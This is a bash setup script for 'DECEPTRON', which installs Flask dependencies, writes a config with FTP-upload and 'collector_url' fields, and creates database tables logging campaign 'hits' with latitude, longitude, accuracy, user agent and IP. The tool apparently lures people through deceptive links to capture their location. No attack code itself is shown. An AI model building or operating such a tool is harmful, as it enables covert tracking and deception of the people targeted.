#!/bin/bash
# DECEPTRON Setup
# Created by: anonymous-beta | https://github.com/anonymous-beta

set -e

echo "[+] DECEPTRON v1.0 — Setup"
echo "[+] Author: anonymous-beta"

# Check dependencies
command -v python3 >/dev/null 2>&1 || { echo "[!] python3 required"; exit 1; }
command -v pip3 >/dev/null 2>&1 || { echo "[!] pip3 required"; exit 1; }

# Create structure
mkdir -p templates db generated static/css static/js static/img

# Install Python deps
pip3 install flask flask-cors requests --user 2>/dev/null || pip3 install flask flask-cors requests

# Create empty config if missing
if [ ! -f config.json ]; then
    cat > config.json << 'EOF'
{
    "ftp_host": "",
    "ftp_user": "",
    "ftp_pass": "",
    "ftp_path": "/public_html",
    "base_url": "",
    "server_host": "0.0.0.0",
    "server_port": 5000,
    "collector_url": "",
    "map_tile_url": "https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}",
    "db_path": "db/hits.db"
}
EOF
    echo "[!] config.json created — edit it before generating campaigns"
fi

# Init DB
python3 -c "
import sqlite3, json
cfg = json.load(open('config.json'))
conn = sqlite3.connect(cfg.get('db_path', 'db/hits.db'))
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS hits (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    campaign_id TEXT,
    session_id TEXT,
    latitude REAL,
    longitude REAL,
    accuracy REAL,
    user_agent TEXT,
    ip TEXT,
    timestamp INTEGER DEFAULT (strftime('%s', 'now')),
    processed BOOLEAN DEFAULT 0
)''')
c.execute('''CREATE TABLE IF NOT EXISTS campaigns (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    name TEXT UNIQUE,
    template_type TEXT,
    redirect_url TEXT,
    link TEXT,
    created_at INTEGER DEFAULT (strftime('%s', 'now'))
)''')
c.execute('''CREATE TABLE IF NOT EXISTS sessions (
    id TEXT PRIMARY KEY,
    campaign_id TEXT,
    first_seen INTEGER,
    last_seen INTEGER,
    hit_count INTEGER DEFAULT 1
)''')
conn.commit()
conn.close()
"

chmod +x deceptron.sh
echo "[+] Setup complete. Run: ./deceptron.sh server"
